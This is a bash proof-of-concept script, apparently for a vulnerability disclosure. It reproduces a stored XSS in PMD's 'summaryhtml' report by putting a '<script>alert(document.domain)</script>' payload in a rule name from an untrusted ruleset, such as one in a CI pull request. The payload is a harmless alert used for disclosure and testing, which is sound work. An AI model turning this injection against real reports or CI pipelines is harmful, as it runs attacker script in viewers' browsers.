#!/usr/bin/env bash
#
# Proof of concept: PMD's `summaryhtml` report format writes each rule's name into
# the HTML summary table without escaping. A rule whose name contains markup is
# emitted verbatim, so the report executes script when opened in a browser.
#
# The rule name comes from the ruleset. This reproduces when the ruleset used for
# analysis is attacker-influenced (for example a ruleset checked out from an
# untrusted pull request in CI).
#
# Non-destructive: everything happens inside ./work, which is deleted first.
#
# PMD binary: set PMD_BIN to your pmd launcher, or the script downloads 7.27.0.

set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
WORK="$HERE/work"
PMD_VERSION="7.27.0"

rm -rf "$WORK"; mkdir -p "$WORK/src"

if [ -n "${PMD_BIN:-}" ] && [ -x "${PMD_BIN}" ]; then
  PMD="$PMD_BIN"
else
  DIST="$HERE/pmd-bin-${PMD_VERSION}"
  if [ ! -x "$DIST/bin/pmd" ]; then
    echo "[*] downloading PMD ${PMD_VERSION} ..."
    curl -sSL -o "$HERE/pmd.zip" \
      "https://github.com/pmd/pmd/releases/download/pmd_releases/${PMD_VERSION}/pmd-dist-${PMD_VERSION}-bin.zip"
    unzip -q -o "$HERE/pmd.zip" -d "$HERE"
  fi
  PMD="$DIST/bin/pmd"
fi
echo "[*] using: $PMD"

echo 'public class A { void m() {} }' > "$WORK/src/A.java"

# a rule whose NAME is an XSS payload (XML entities decode to raw < >)
cat > "$WORK/ruleset.xml" <<'EOF'
<?xml version="1.0"?>
<ruleset name="poc" xmlns="http://pmd.sourceforge.net/ruleset/2.0.0">
  <description>poc</description>
  <rule name="&lt;script&gt;alert(document.domain)&lt;/script&gt;"
        language="java" message="hit"
        class="net.sourceforge.pmd.lang.rule.xpath.XPathRule">
    <properties>
      <property name="xpath"><value>//ClassDeclaration</value></property>
    </properties>
  </rule>
</ruleset>
EOF

echo "[*] running: pmd check -f summaryhtml ..."
"$PMD" check -d "$WORK/src" -R "$WORK/ruleset.xml" -f summaryhtml --no-cache \
  > "$WORK/report.html" 2> "$WORK/stderr.txt" || true

echo
echo "[*] summary-table lines from work/report.html:"
grep -n "alert(document.domain)" "$WORK/report.html" || true
echo

if grep -q "<script>alert(document.domain)</script>" "$WORK/report.html"; then
  echo "[RESULT] VULNERABLE: the rule name is written into the HTML report unescaped."
  echo "         Open work/report.html in a browser and the script executes."
  exit 0
else
  echo "[RESULT] Not reproduced (the target may be patched)."
  exit 1
fi
